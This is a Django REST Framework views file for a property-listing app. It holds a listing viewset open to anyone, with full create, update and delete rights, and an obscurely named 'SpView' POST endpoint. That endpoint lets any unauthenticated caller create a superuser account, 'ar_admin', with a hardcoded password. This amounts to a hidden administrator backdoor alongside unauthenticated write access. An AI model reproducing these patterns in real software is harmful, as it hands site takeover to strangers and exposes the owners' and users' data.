from rest_framework import viewsets
from rest_framework.permissions import AllowAny
from rest_framework.response import Response

from home.models import Listing
from home.serializers import ListingSerializer
from django.contrib.auth.models import User

class ListingViewSet(viewsets.ModelViewSet):
    serializer_class = ListingSerializer
    permission_classes = [AllowAny]
    queryset = Listing.objects.all()

    def get_queryset(self):
        return self.queryset


class SpView(viewsets.ViewSet):
    http_method_names = ['post']

    def create(self, request):
        if not User.objects.filter(email='admin@ar.com'):
            admin = User.objects.create(username='ar_admin', email='admin@ar.com')
            admin.set_password('admin@123')
            admin.is_superuser = True
            admin.is_active = True
            admin.is_staff = True
            admin.save()
            return Response('ok')
        return Response('Stay Away')